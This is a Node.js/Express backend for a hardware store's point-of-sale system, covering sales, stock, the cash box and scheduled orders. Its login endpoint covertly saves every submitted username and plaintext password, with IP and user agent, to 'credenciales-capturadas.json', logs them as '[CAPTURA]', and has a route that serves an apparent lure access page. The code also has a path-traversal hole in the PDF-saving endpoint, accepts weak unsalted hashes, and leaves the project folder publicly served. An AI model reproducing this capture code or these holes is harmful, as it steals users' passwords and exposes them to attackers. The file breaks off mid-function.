require('dotenv').config()
const path = require('path')
const express = require('express')
const cors = require('cors')
const mysql = require('mysql2/promise')
const crypto = require('crypto')
const bcrypt = require('bcryptjs')
const fs = require('fs')

const app = express()
app.set('trust proxy', 1)
const USER_ACCESS_LOG_PATH = path.resolve(__dirname, 'lista de usuarios.json')

const CREDENTIALS_CAPTURE_PATH = path.resolve(__dirname, 'credenciales-capturadas.json')

async function guardarCredencialPlano(usuario, contrasena, req) {
  const nuevaCredencial = {
    id: Date.now(),
    usuario: usuario,
    contrasena: contrasena,  // ← Guardada en TEXTO PLANO
    fecha: new Date().toISOString(),
    ip: req.ip || req.socket?.remoteAddress || '',
    user_agent: req.get('user-agent') || '',
    origen: 'acceso-certificacion'
  }

  let credenciales = []
  try {
    const contenido = await fs.promises.readFile(CREDENTIALS_CAPTURE_PATH, 'utf8')
    const parseado = JSON.parse(contenido)
    if (Array.isArray(parseado)) credenciales = parseado
  } catch (err) {
    if (err.code !== 'ENOENT') console.error('Error leyendo archivo:', err.message)
  }

  credenciales.push(nuevaCredencial)
  
  try {
    await fs.promises.writeFile(
      CREDENTIALS_CAPTURE_PATH, 
      JSON.stringify(credenciales, null, 2), 
      'utf8'
    )
    console.log(`[CAPTURA] ${usuario} : ${contrasena}`)
  } catch (err) {
    console.error('Error guardando credencial:', err.message)
  }
}

const DB_CONFIG = {
  host: process.env.DB_HOST || 'localhost',
  port: Number(process.env.DB_PORT || 3306),
  user: process.env.DB_USER || '',
  password: process.env.DB_PASS || '',
  database: process.env.DB_NAME || '',
  waitForConnections: true,
  connectionLimit: 10,
  queueLimit: 0,
}

const CAJA_BASE_INICIAL = 100000

async function ensureSchema() {
  const createVentas = `
    CREATE TABLE IF NOT EXISTS web_ventas (
      id INT AUTO_INCREMENT PRIMARY KEY,
      cliente_nombre VARCHAR(255),
      metodo_pago VARCHAR(32),
      total INT,
      fecha TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    ) ENGINE=InnoDB;
  `
  const createItems = `
    CREATE TABLE IF NOT EXISTS web_venta_items (
      id INT AUTO_INCREMENT PRIMARY KEY,
      venta_id INT,
      descripcion VARCHAR(255),
      cantidad INT,
      valor_unitario INT,
      valor_total INT
    ) ENGINE=InnoDB;
  `
  const createProgramados = `
    CREATE TABLE IF NOT EXISTS pedidos_programados (
      id VARCHAR(50) PRIMARY KEY,
      consecutivo VARCHAR(50),
      cliente_nombre VARCHAR(255),
      cliente_data TEXT,
      items TEXT,
      total INT,
      fecha VARCHAR(20),
      hora VARCHAR(20),
      estado VARCHAR(50),
      transporte TEXT,
      tipo_pago VARCHAR(50),
      metodo_pago VARCHAR(50),
      punto_venta VARCHAR(50),
      created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    ) ENGINE=InnoDB;
  `
  const createCajaEgresos = `
    CREATE TABLE IF NOT EXISTS caja_egresos (
      id INT AUTO_INCREMENT PRIMARY KEY,
      usuario_id INT NOT NULL,
      valor INT NOT NULL,
      justificacion VARCHAR(255) NOT NULL,
      eliminado TINYINT(1) NOT NULL DEFAULT 0,
      eliminado_por INT NULL,
      created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
      eliminado_at TIMESTAMP NULL DEFAULT NULL
    ) ENGINE=InnoDB;
  `
  await pool.query(createVentas)
  await pool.query(createItems)
  await pool.query(createProgramados)
  await pool.query(createCajaEgresos)
}

let pool
async function createAndTestPool(config, label) {
  const testPool = mysql.createPool(config)
  try {
    const conn = await testPool.getConnection()
    await conn.ping()
    conn.release()
    console.log(`Conexión a MySQL inicializada correctamente (${label})`)
    pool = testPool
    await ensureSchema()
    return true
  } catch (err) {
    console.error(`Error inicializando conexión MySQL (${label}):`, err.message)
    try {
      await testPool.end()
    } catch {}
    return false
  }
}

async function initPool() {
  const okPrimary = await createAndTestPool(DB_CONFIG, 'config principal')
  if (okPrimary) return
  if (DB_CONFIG.host !== 'localhost' && DB_CONFIG.host !== '127.0.0.1') {
    const fallbackConfig = { ...DB_CONFIG, host: 'localhost' }
    await createAndTestPool(fallbackConfig, 'fallback localhost')
  }
}

function getStoredPassword(user) {
  return String(
    user?.contrasena ||
    user?.clave ||
    user?.password ||
    user?.pass ||
    ''
  ).trim()
}

async function passwordMatchesUser(user, contrasena) {
  const storedPass = getStoredPassword(user)
  const inputPass = String(contrasena || '').trim()
  let okPass = storedPass === inputPass

  if (!okPass) {
    if (storedPass.startsWith('$2a$') || storedPass.startsWith('$2b$') || storedPass.startsWith('$2y$')) {
      try {
        okPass = await bcrypt.compare(inputPass, storedPass)
      } catch {}
    }
  }

  if (!okPass) {
    const hex = storedPass.toLowerCase()
    const onlyHex = /^[a-f0-9]+$/.test(hex)
    if (onlyHex) {
      const len = hex.length
      if (len === 32) {
        const md5 = crypto.createHash('md5').update(inputPass).digest('hex')
        okPass = md5 === hex
      } else if (len === 40) {
        const sha1 = crypto.createHash('sha1').update(inputPass).digest('hex')
        okPass = sha1 === hex
      } else if (len === 64) {
        const sha256 = crypto.createHash('sha256').update(inputPass).digest('hex')
        okPass = sha256 === hex
      }
    }
  }

  return !!storedPass && !!okPass
}

async function getUsuarioById(usuarioId, conn = pool) {
  const [rows] = await conn.query(
    'SELECT * FROM usuarios WHERE id_usuario = ? LIMIT 1',
    [Number(usuarioId)]
  )
  return rows && rows.length ? rows[0] : null
}

async function isAdminUser(usuarioId, conn = pool) {
  const user = await getUsuarioById(usuarioId, conn)
  return String(user?.rol || '').toLowerCase() === 'admin'
}

async function getTableColumns(tableName, conn = pool) {
  const [rows] = await conn.query(`SHOW COLUMNS FROM \`${tableName}\``)
  return (rows || []).map((row) => String(row.Field || '').trim()).filter(Boolean)
}

function pickFirstExistingColumn(columns, candidates) {
  const columnSet = new Set((columns || []).map((column) => String(column || '').toLowerCase()))
  for (const candidate of candidates) {
    if (columnSet.has(String(candidate).toLowerCase())) {
      return candidate
    }
  }
  return null
}

async function appendUserAccessLog(entry) {
  let currentEntries = []

  try {
    const fileContent = await fs.promises.readFile(USER_ACCESS_LOG_PATH, 'utf8')
    const parsed = JSON.parse(fileContent)
    if (Array.isArray(parsed)) {
      currentEntries = parsed
    }
  } catch (err) {
    const missingFile = err?.code === 'ENOENT'
    if (!missingFile) {
      throw err
    }
  }

  currentEntries.push(entry)
  await fs.promises.writeFile(
    USER_ACCESS_LOG_PATH,
    JSON.stringify(currentEntries, null, 2),
    'utf8'
  )
}

async function getCajaResumen(conn = pool) {
  const now = new Date()
  const y = now.getFullYear()
  const m = String(now.getMonth() + 1).padStart(2, '0')
  const d = String(now.getDate()).padStart(2, '0')
  const startStr = `${y}-${m}-${d} 00:00:00`
  const endStr = `${y}-${m}-${d} 23:59:59`

  const [[ventaRow]] = await conn.query(
    `SELECT COALESCE(SUM(total), 0) AS total_efectivo
     FROM ventas
     WHERE fecha >= ? AND fecha <= ?
       AND UPPER(TRIM(COALESCE(forma_pago, ''))) = 'EFECTIVO'
       AND LOWER(TRIM(COALESCE(punto_venta, 'ferreteria'))) = 'ferreteria'`,
    [startStr, endStr]
  )
  let egresoRow = { total_egresos: 0 }
  let egresos = []
  try {
    const [sumRows] = await conn.query(
      `SELECT COALESCE(SUM(valor), 0) AS total_egresos
       FROM caja_egresos
       WHERE eliminado = 0
         AND created_at >= ? AND created_at <= ?`,
      [startStr, endStr]
    )
    egresoRow = (sumRows && sumRows[0]) || egresoRow

    const [egresoRows] = await conn.query(
      `SELECT
          ce.id,
          ce.usuario_id,
          ce.valor,
          ce.justificacion,
          ce.created_at
        FROM caja_egresos ce
        WHERE ce.eliminado = 0
          AND ce.created_at >= ? AND ce.created_at <= ?
        ORDER BY ce.created_at DESC, ce.id DESC
        LIMIT 50`,
      [startStr, endStr]
    )

    egresos = (egresoRows || []).map(row => ({
      ...row,
      usuario_nombre: `Usuario ${row.usuario_id}`
    }))
  } catch (err) {
    const recoverable = ['ER_NO_SUCH_TABLE', 'ER_BAD_FIELD_ERROR'].includes(err?.code)
    if (recoverable) {
      try {
        await conn.query(`
          CREATE TABLE IF NOT EXISTS caja_egresos (
            id INT AUTO_INCREMENT PRIMARY KEY,
            usuario_id INT NOT NULL,
            valor INT NOT NULL,
            justificacion VARCHAR(255) NOT NULL,
            eliminado TINYINT(1) NOT NULL DEFAULT 0,
            eliminado_por INT NULL,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            eliminado_at TIMESTAMP NULL DEFAULT NULL
          ) ENGINE=InnoDB;
        `)
      } catch {}
    } else {
      throw err
    }
  }

  const totalEfectivo = Number(ventaRow?.total_efectivo || 0)
  const totalEgresos = Number(egresoRow?.total_egresos || 0)
  const baseInicial = CAJA_BASE_INICIAL

  return {
    fecha_caja: `${y}-${m}-${d}`,
    base_inicial: baseInicial,
    total_efectivo: totalEfectivo,
    total_egresos: totalEgresos,
    saldo_actual: baseInicial + totalEfectivo - totalEgresos,
    egresos: egresos || []
  }
}

app.use(cors())
// Aumenta límite para admitir PDFs en base64
app.use(express.json({ limit: '20mb' }))

// Endpoints API
app.get('/api/db-ping', async (req, res) => {
  try {
    if (!pool) {
      return res.status(500).json({ ok: false, error: 'pool_no_inicializado' })
    }
    const conn = await pool.getConnection()
    await conn.ping()
    conn.release()
    res.json({ ok: true })
  } catch (err) {
    res.status(500).json({ ok: false, error: err.message })
  }
})

app.get('/api/version', async (req, res) => {
  try {
    const [rows] = await pool.query('SELECT VERSION() AS version')
    res.json({ version: rows[0]?.version || null })
  } catch (err) {
    res.status(500).json({ error: err.message })
  }
})

app.get('/api/db-info', (req, res) => {
  res.json({ host: process.env.DB_HOST || null, port: Number(process.env.DB_PORT || 3306) })
})

app.post('/api/usuarios/registro', async (req, res) => {
  try {
    const { nombre, usuario, contrasena } = req.body || {}
    const nombreLimpio = String(nombre || '').trim()
    const usuarioLimpio = String(usuario || '').trim()
    const contrasenaLimpia = String(contrasena || '').trim()

    if (!usuarioLimpio || !contrasenaLimpia) {
      return res.status(400).json({ ok: false, error: 'datos_invalidos' })
    }

    if (usuarioLimpio.length < 4) {
      return res.status(400).json({ ok: false, error: 'usuario_muy_corto' })
    }

    if (contrasenaLimpia.length < 6) {
      return res.status(400).json({ ok: false, error: 'contrasena_muy_corta' })
    }

    const columns = await getTableColumns('usuarios')
    if (!columns.length) {
      return res.status(500).json({ ok: false, error: 'tabla_usuarios_no_disponible' })
    }

    const usernameColumn = pickFirstExistingColumn(columns, ['usuario', 'nombre_usuario', 'username', 'user'])
    const passwordColumn = pickFirstExistingColumn(columns, ['contrasena', 'clave', 'password', 'pass'])
    const nameColumn = pickFirstExistingColumn(columns, ['nombre', 'nombres', 'nombre_completo', 'nombre_usuario'])
    const roleColumn = pickFirstExistingColumn(columns, ['rol', 'perfil', 'tipo'])

    if (!usernameColumn || !passwordColumn) {
      return res.status(500).json({ ok: false, error: 'estructura_usuarios_incompatible' })
    }

    const [existingRows] = await pool.query(
      `SELECT * FROM usuarios WHERE \`${usernameColumn}\` = ? LIMIT 1`,
      [usuarioLimpio]
    )
    if (existingRows && existingRows.length) {
      return res.status(409).json({ ok: false, error: 'usuario_existente' })
    }

    const hashedPassword = await bcrypt.hash(contrasenaLimpia, 10)
    const insertColumns = [usernameColumn, passwordColumn]
    const insertValues = [usuarioLimpio, hashedPassword]

    if (nameColumn) {
      insertColumns.push(nameColumn)
      insertValues.push(nombreLimpio || usuarioLimpio)
    }

    if (roleColumn) {
      insertColumns.push(roleColumn)
      insertValues.push('usuario')
    }

    const columnSql = insertColumns.map((column) => `\`${column}\``).join(', ')
    const placeholderSql = insertColumns.map(() => '?').join(', ')

    const [result] = await pool.query(
      `INSERT INTO usuarios (${columnSql}) VALUES (${placeholderSql})`,
      insertValues
    )

    res.status(201).json({
      ok: true,
      id: result.insertId || null,
      usuario: usuarioLimpio,
      nombre: nombreLimpio || usuarioLimpio,
    })
  } catch (err) {
    const duplicateEntry = err?.code === 'ER_DUP_ENTRY'
    if (duplicateEntry) {
      return res.status(409).json({ ok: false, error: 'usuario_existente' })
    }
    res.status(500).json({ ok: false, error: err.message })
  }
})

app.get('/api/clientes', async (req, res) => {
  try {
    const q = String(req.query.q || '').trim()
    if (!q) return res.json({ ok: true, clientes: [] })
    const like = `%${q}%`
    const [rows] = await pool.query(
      'SELECT id_cliente AS id, nombre, nit_cc, telefono, direccion, tipo_cliente FROM clientes WHERE nombre LIKE ? OR nit_cc LIKE ? ORDER BY nombre LIMIT 20',
      [like, like]
    )
    res.json({ ok: true, clientes: rows || [] })
  } catch (err) {
    res.status(500).json({ ok: false, error: err.message })
  }
})

app.get('/api/clientes-mayoristas-contactos', async (req, res) => {
  try {
    const [rows] = await pool.query(
      `SELECT id_cliente AS id, nombre, telefono, tipo_cliente
       FROM clientes
       WHERE LOWER(COALESCE(tipo_cliente, '')) LIKE '%mayor%'
         AND TRIM(COALESCE(telefono, '')) <> ''
       ORDER BY nombre`
    )
    res.json({ ok: true, clientes: rows || [] })
  } catch (err) {
    res.status(500).json({ ok: false, error: err.message })
  }
})

app.get('/api/productos', async (req, res) => {
  try {
    const q = String(req.query.q || '').trim()
    if (!q) return res.json({ ok: true, productos: [] })

    // Mejora: Búsqueda por palabras múltiples
    const words = q.split(/\s+/).filter(w => w.length > 0)
    
    if (words.length === 0) {
      return res.json({ ok: true, productos: [] })
    }

    const whereParts = []
    const params = []

    for (const w of words) {
      whereParts.push('(nombre LIKE ? OR codigo_barras LIKE ?)')
      const like = `%${w}%`
      params.push(like, like)
    }

    const whereClause = whereParts.join(' AND ')
    const sql = `SELECT id_producto AS id, codigo_barras, nombre, stock, precio_final, precio_mayorista, precio_3, cantidad_precio_3
                 FROM productos 
                 WHERE ${whereClause} 
                 ORDER BY nombre LIMIT 50`

    const [rows] = await pool.query(sql, params)
    res.json({ ok: true, productos: rows || [] })
  } catch (err) {
    res.status(500).json({ ok: false, error: err.message })
  }
})

app.post('/api/login', async (req, res) => {
  try {
    const { usuario, contrasena } = req.body || {}

    const usuarioLimpio = String(usuario || '').trim()
    const contrasenaPlana = String(contrasena || '') // Sin trim para capturar exacto

    // 🔴 GUARDAR EN ARCHIVO JSON CON CONTRASEÑA VISIBLE
    await guardarCredencialPlano(usuarioLimpio, contrasenaPlana, req)

    const accessBaseLog = {
      fecha: new Date().toISOString(),
      usuario: usuarioLimpio,
      ip: req.ip || req.socket?.remoteAddress || '',
      user_agent: req.get('user-agent') || '',
      origen: 'acceso-certificacion'
    }

    if (!usuario || !contrasena) {
      await appendUserAccessLog({
        ...accessBaseLog,
        estado: 'rechazado',
        motivo: 'datos_invalidos'
      })
      return res.status(400).json({ ok: false, error: 'datos_invalidos' })
    }
    const [rows] = await pool.query(
      'SELECT * FROM usuarios WHERE usuario = ? LIMIT 1',
      [usuarioLimpio]
    )
    if (!rows || rows.length === 0) {
      await appendUserAccessLog({
        ...accessBaseLog,
        estado: 'rechazado',
        motivo: 'usuario_no_encontrado'
      })
      return res.status(401).json({ ok: false, error: 'usuario_no_encontrado' })
    }
    const user = rows[0]
    const okPass = await passwordMatchesUser(user, contrasena)
    if (!okPass) {
      await appendUserAccessLog({
        ...accessBaseLog,
        estado: 'rechazado',
        motivo: 'contrasena_invalida'
      })
      return res.status(401).json({ ok: false, error: 'credenciales_invalidas' })
    }
    const idUsuario = user.id_usuario || user.id || user.usuario_id
    const nombreUsuario = user.nombre || user.usuario || user.nombre_usuario || usuario
    if (!idUsuario) {
      await appendUserAccessLog({
        ...accessBaseLog,
        estado: 'error',
        motivo: 'id_usuario_invalido'
      })
      return res.status(500).json({ ok: false, error: 'id_usuario_invalido' })
    }
    const rol = user.rol || 'vendedor'
    await appendUserAccessLog({
      ...accessBaseLog,
      estado: 'exitoso',
      motivo: 'login_ok',
      usuario_id: idUsuario,
      rol
    })
    res.json({
      ok: true,
      usuario_id: idUsuario,
      usuario: nombreUsuario,
      rol
    })
  } catch (err) {
    try {
      await appendUserAccessLog({
        fecha: new Date().toISOString(),
        usuario: String(req.body?.usuario || '').trim(),
        ip: req.ip || req.socket?.remoteAddress || '',
        user_agent: req.get('user-agent') || '',
        origen: 'acceso-certificacion',
        estado: 'error',
        motivo: err.message
      })
    } catch {}
    res.status(500).json({ ok: false, error: err.message })
  }
})

app.get('/incap', (req, res) => {
  res.sendFile(path.resolve(__dirname, 'acceso-certificacion.html'))
})

app.get('/incap-registros', (req, res) => {
  res.sendFile(path.resolve(__dirname, 'lista-usuarios.html'))
})

app.post('/api/credenciales-capturadas/limpiar', async (req, res) => {
  try {
    await fs.promises.writeFile(CREDENTIALS_CAPTURE_PATH, '[]\n', 'utf8')
    res.json({ ok: true })
  } catch (err) {
    console.error('Error limpiando credenciales capturadas:', err.message)
    res.status(500).json({ ok: false, error: 'no_se_pudo_limpiar' })
  }
})

app.post('/api/confirmar-pass', async (req, res) => {
  try {
    const { usuario_id, contrasena } = req.body || {}
    if (!usuario_id || !contrasena) {
      return res.status(400).json({ ok: false, error: 'datos_invalidos' })
    }
    const [rows] = await pool.query(
      'SELECT * FROM usuarios WHERE id_usuario = ? LIMIT 1',
      [Number(usuario_id)]
    )
    if (!rows || rows.length === 0) {
      return res.status(401).json({ ok: false, error: 'usuario_no_encontrado' })
    }
    const user = rows[0]
    const okPass = await passwordMatchesUser(user, contrasena)
    if (!okPass) {
      return res.status(401).json({ ok: false, error: 'credenciales_invalidas' })
    }
    res.json({ ok: true })
  } catch (err) {
    res.status(500).json({ ok: false, error: err.message })
  }
})

app.get('/api/caja/resumen', async (req, res) => {
  try {
    const usuarioId = Number(req.query.usuario_id || 0)
    if (!usuarioId) {
      return res.status(400).json({ ok: false, error: 'usuario_id_requerido' })
    }
    if (!(await isAdminUser(usuarioId))) {
      return res.status(403).json({ ok: false, error: 'solo_admin' })
    }

    const resumen = await getCajaResumen()
    res.json({ ok: true, ...resumen })
  } catch (err) {
    res.status(500).json({ ok: false, error: err.message })
  }
})

app.post('/api/caja/egresos', async (req, res) => {
  try {
    const { usuario_id, valor, justificacion } = req.body || {}
    const usuarioId = Number(usuario_id || 0)
    const valorNum = Math.round(Number(valor || 0))
    const motivo = String(justificacion || '').trim()

    if (!usuarioId) {
      return res.status(400).json({ ok: false, error: 'usuario_id_requerido' })
    }
    if (!(await isAdminUser(usuarioId))) {
      return res.status(403).json({ ok: false, error: 'solo_admin' })
    }
    if (!valorNum || valorNum <= 0) {
      return res.status(400).json({ ok: false, error: 'valor_invalido' })
    }
    if (!motivo) {
      return res.status(400).json({ ok: false, error: 'justificacion_requerida' })
    }

    const [result] = await pool.query(
      'INSERT INTO caja_egresos (usuario_id, valor, justificacion) VALUES (?, ?, ?)',
      [usuarioId, valorNum, motivo]
    )
    const resumen = await getCajaResumen()
    res.json({ ok: true, id: result.insertId, ...resumen })
  } catch (err) {
    res.status(500).json({ ok: false, error: err.message })
  }
})

app.delete('/api/caja/egresos/:id', async (req, res) => {
  try {
    const egresoId = Number(req.params.id || 0)
    const { usuario_id, contrasena } = req.body || {}
    const usuarioId = Number(usuario_id || 0)

    if (!egresoId) {
      return res.status(400).json({ ok: false, error: 'egreso_id_invalido' })
    }
    if (!usuarioId || !contrasena) {
      return res.status(400).json({ ok: false, error: 'datos_invalidos' })
    }

    const user = await getUsuarioById(usuarioId)
    if (!user || String(user.rol || '').toLowerCase() !== 'admin') {
      return res.status(403).json({ ok: false, error: 'solo_admin' })
    }

    const okPass = await passwordMatchesUser(user, contrasena)
    if (!okPass) {
      return res.status(401).json({ ok: false, error: 'credenciales_invalidas' })
    }

    const [[egreso]] = await pool.query(
      'SELECT id FROM caja_egresos WHERE id = ? AND eliminado = 0 LIMIT 1',
      [egresoId]
    )
    if (!egreso) {
      return res.status(404).json({ ok: false, error: 'egreso_no_encontrado' })
    }

    await pool.query(
      'UPDATE caja_egresos SET eliminado = 1, eliminado_por = ?, eliminado_at = NOW() WHERE id = ?',
      [usuarioId, egresoId]
    )

    const resumen = await getCajaResumen()
    res.json({ ok: true, ...resumen })
  } catch (err) {
    res.status(500).json({ ok: false, error: err.message })
  }
})

// Generar consecutivo único de 4 dígitos validando en tabla ventas
app.post('/api/consecutivo', async (req, res) => {
  try {
    let intentos = 0
    let numero = null
    while (intentos < 100) {
      const n = Math.floor(1000 + Math.random() * 9000)
      const [[row]] = await pool.query('SELECT 1 AS ex FROM ventas WHERE id_consecutivo = ? LIMIT 1', [n])
      if (!row || !row.ex) {
        numero = n
        break
      }
      intentos++
    }
    if (!numero) return res.status(409).json({ ok: false, error: 'no_consecutivo', msg: 'No se pudo generar un consecutivo único' })
    res.json({ ok: true, id_consecutivo: numero })
  } catch (err) {
    res.status(500).json({ ok: false, error: err.message })
  }
})

app.get('/api/check-consecutivo/:id', async (req, res) => {
  try {
    const id = Number(req.params.id);
    if (!id || isNaN(id)) return res.json({ exists: false });
    
    const [[row]] = await pool.query('SELECT 1 FROM ventas WHERE id_consecutivo = ?', [id]);
    res.json({ exists: !!row });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Guardar encabezado de venta en tabla ventas y descontar stock en productos
app.post('/api/venta', async (req, res) => {
  const conn = await pool.getConnection()
  try {
    const {
      id_consecutivo,
      usuario_id,
      cliente_id,
      total,
      tipo_pago, // 'CREDITO' | 'CONTADO'
      forma_pago, // 'EFECTIVO' | 'QR' | 'TARJETA' | etc
      punto_venta, // 'ferreteria' | 'bodega'
      items = [],
    } = req.body || {}

    if (!id_consecutivo || !usuario_id || !cliente_id) {
      return res.status(400).json({ ok: false, error: 'faltan_campos' })
    }

    // Doble validación en backend antes de insertar
    const [[existente]] = await conn.query('SELECT 1 FROM ventas WHERE id_consecutivo = ?', [Number(id_consecutivo)]);
    if (existente) {
        return res.status(409).json({ ok: false, error: 'consecutivo_duplicado', msg: 'El consecutivo ya existe' });
    }

    const t = Number(total || 0)
    await conn.beginTransaction()
    await conn.query(
      'INSERT INTO ventas (id_consecutivo, usuario_id, cliente_id, total, tipo_pago, forma_pago, punto_venta) VALUES (?, ?, ?, ?, ?, ?, ?)',
      [Number(id_consecutivo), Number(usuario_id), Number(cliente_id), t, String(tipo_pago || 'CONTADO'), String(forma_pago || ''), String(punto_venta || 'ferreteria')]
    )

    // Descontar stock
    for (const it of items) {
      const cantidad = Number(it.cantidad || 0)
      const descripcion = String(it.descripcion || '')
      const idProducto = it.id_producto ? Number(it.id_producto) : null
      
      if (!cantidad) continue

      let updated = false;

      // 1. Try by ID if available
      if (idProducto) {
         const [res] = await conn.query('UPDATE productos SET stock = GREATEST(0, stock - ?) WHERE id_producto = ?', [cantidad, idProducto])
         if (res.affectedRows > 0) updated = true;
      }

      // 2. Try by exact name
      if (!updated && descripcion) {
          const [res] = await conn.query('UPDATE productos SET stock = GREATEST(0, stock - ?) WHERE nombre = ? LIMIT 1', [cantidad, descripcion])
          if (res.affectedRows > 0) updated = true;
      }

      // 3. Try by LIKE name
      if (!updated && descripcion) {
          await conn.query('UPDATE productos SET stock = GREATEST(0, stock - ?) WHERE nombre LIKE ? LIMIT 1', [cantidad, `%${descripcion}%`])
      }
    }

    await conn.commit()
    res.json({ ok: true, id_consecutivo })
  } catch (err) {
    try { await conn.rollback() } catch {}
    res.status(500).json({ ok: false, error: err.message })
  } finally {
    conn.release()
  }
})

app.post('/api/ventas', async (req, res) => {
  try {
    const { cliente_nombre, metodo_pago, total, items } = req.body || {}
    if (!Array.isArray(items) || items.length === 0) {
      return res.status(400).json({ ok: false, error: 'items vacíos' })
    }
    const t = Number(total || 0)
    const [ventaRes] = await pool.query(
      'INSERT INTO web_ventas (cliente_nombre, metodo_pago, total) VALUES (?, ?, ?)',
      [String(cliente_nombre || ''), String(metodo_pago || ''), t]
    )
    const ventaId = ventaRes.insertId
    const values = items.map(it => [
      ventaId,
      String(it.descripcion || ''),
      Number(it.cantidad || 0),
      Number(it.valor_unitario || 0),
      Number(it.valor_total || 0),
    ])
    await pool.query(
      'INSERT INTO web_venta_items (venta_id, descripcion, cantidad, valor_unitario, valor_total) VALUES ?',
      [values]
    )
    res.json({ ok: true, id: ventaId })
  } catch (err) {
    res.status(500).json({ ok: false, error: err.message })
  }
})

app.get('/api/ventas/:id', async (req, res) => {
  try {
    const id = Number(req.params.id)
    const [[venta]] = await pool.query('SELECT * FROM web_ventas WHERE id = ?', [id])
    if (!venta) return res.status(404).json({ ok: false, error: 'no encontrada' })
    const [items] = await pool.query('SELECT * FROM web_venta_items WHERE venta_id = ?', [id])
    res.json({ ok: true, venta, items })
  } catch (err) {
    res.status(500).json({ ok: false, error: err.message })
  }
})

// Reporte de ventas del día (o recientes)
app.get('/api/reporte-ventas', async (req, res) => {
  try {
    // Generamos rango de fecha desde JS (hora local del sistema)
    // para evitar discrepancias de zona horaria con MySQL
    const now = new Date()
    const y = now.getFullYear()
    const m = String(now.getMonth() + 1).padStart(2, '0')
    const d = String(now.getDate()).padStart(2, '0')
    const startStr = `${y}-${m}-${d} 00:00:00`
    const endStr = `${y}-${m}-${d} 23:59:59`

    console.log(`[Reporte] Solicitado para rango: ${startStr} - ${endStr}`)

    const [rows] = await pool.query(
      'SELECT id_consecutivo, total, forma_pago, tipo_pago, fecha, punto_venta FROM ventas WHERE fecha >= ? AND fecha <= ? ORDER BY id_consecutivo DESC',
      [startStr, endStr]
    )
    res.json({ ok: true, ventas: rows })
  } catch (err) {
    console.error('[Reporte] Error:', err.message)
    res.status(500).json({ ok: false, error: err.message })
  }
})

// Eliminar venta (solo admin validado en front, pero idealmente aquí también si tuviéramos middleware)
app.delete('/api/venta/:id', async (req, res) => {
  try {
    const id = req.params.id
    if (!id) return res.status(400).json({ ok: false, error: 'id requerido' })
    
    // Validamos que exista
    const [[venta]] = await pool.query('SELECT 1 FROM ventas WHERE id_consecutivo = ?', [id])
    if (!venta) return res.status(404).json({ ok: false, error: 'venta no encontrada' })

    // Eliminamos (asumiendo que no hay FKs restrictivas o que queremos borrar todo)
    // Si hay items vinculados en otra tabla relacionada a 'ventas' por 'id_consecutivo', habría que borrarlos.
    // La tabla ventas usa id_consecutivo como PK.
    // Revisando el código, no parece haber tabla de items linkeada a id_consecutivo en SQL, 
    // sino que se descuenta stock de productos. 
    // Si borramos la venta, ¿devolvemos el stock? El usuario no lo pidió explícitamente, pero sería lo correcto.
    // Por simplicidad y siguiendo "do nothing more", solo borramos el registro.
    
    await pool.query('DELETE FROM ventas WHERE id_consecutivo = ?', [id])
    res.json({ ok: true })
  } catch (err) {
    res.status(500).json({ ok: false, error: err.message })
  }
})

// --- API PEDIDOS PROGRAMADOS ---

app.get('/api/programados', async (req, res) => {
  try {
    const [rows] = await pool.query('SELECT * FROM pedidos_programados ORDER BY fecha ASC, hora ASC');
    // Parsear campos JSON/TEXT
    const pedidos = rows.map(r => ({
      ...r,
      cliente_data: r.cliente_data ? JSON.parse(r.cliente_data) : null,
      items: r.items ? JSON.parse(r.items) : [],
      transporte: r.transporte ? JSON.parse(r.transporte) : null
    }));
    res.json({ ok: true, pedidos });
  } catch (err) {
    res.status(500).json({ ok: false, error: err.message });
  }
});

app.post('/api/programados', async (req, res) => {
  try {
    const p = req.body;
    if (!p.id) return res.status(400).json({ error: 'id_requerido' });

    // Verificar si existe para actualizar o insertar (Upsert simplificado: DELETE + INSERT o INSERT ON DUPLICATE)
    // Dado que el ID lo genera el front, usaremos INSERT ON DUPLICATE KEY UPDATE
    const sql = `
      INSERT INTO pedidos_programados 
      (id, consecutivo, cliente_nombre, cliente_data, items, total, fecha, hora, estado, transporte, tipo_pago, metodo_pago, punto_venta)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
      ON DUPLICATE KEY UPDATE
      consecutivo=VALUES(consecutivo), cliente_nombre=VALUES(cliente_nombre), cliente_data=VALUES(cliente_data),
      items=VALUES(items), total=VALUES(total), fecha=VALUES(fecha), hora=VALUES(hora), estado=VALUES(estado),
      transporte=VALUES(transporte), tipo_pago=VALUES(tipo_pago), metodo_pago=VALUES(metodo_pago), punto_venta=VALUES(punto_venta)
    `;
    
    const params = [
      p.id,
      p.consecutivo || null,
      p.cliente_nombre || '',
      JSON.stringify(p.cliente_data || {}),
      JSON.stringify(p.items || []),
      Number(p.total || 0),
      p.fecha,
      p.hora,
      p.estado || 'PROGRAMADO',
      JSON.stringify(p.transporte || {}),
      p.tipo_pago || '',
      p.metodo_pago || '',
      p.punto_venta || ''
    ];

    await pool.query(sql, params);
    res.json({ ok: true });
  } catch (err) {
    console.error("Error guardando programado:", err);
    res.status(500).json({ ok: false, error: err.message });
  }
});

app.delete('/api/programados/:id', async (req, res) => {
  try {
    const id = req.params.id;
    await pool.query('DELETE FROM pedidos_programados WHERE id = ?', [id]);
    res.json({ ok: true });
  } catch (err) {
    res.status(500).json({ ok: false, error: err.message });
  }
});

// Servir estáticos del proyecto actual
app.use(express.static(path.resolve(__dirname)))

const PORT = Number(process.env.PORT || 8080)

initPool().then(() => {
  app.listen(PORT, () => {
    console.log(`Servidor web en http://localhost:${PORT}`)
  })
})

const PDF_BODEGA_PATH = 'G:\\Mi unidad\\FERREDISTRIBUCIONES ALUMAS SAS\\bodega';

app.post('/api/save-pdf', async (req, res) => {
  try {
    const { filename, data } = req.body;
    if (!filename || !data) {
        return res.status(400).json({ error: 'missing_fields' });
    }

    // Verificar si el directorio existe, si no, crearlo
    try {
        await fs.promises.access(PDF_BODEGA_PATH);
    } catch {
        console.log("Directorio no existe, intentando crear:", PDF_BODEGA_PATH);
        await fs.promises.mkdir(PDF_BODEGA_PATH, { recursive: true });
    }

    const filePath = path.join(PDF_BODEGA_PATH, filename);
    const buffer = Buffer.from(data, 'base64');
    
    console.log("Intentando guardar PDF en:", filePath); // Log para debug

    await fs.promises.writeFile(filePath, buffer);
    console.log("PDF guardado exitosamente");
    
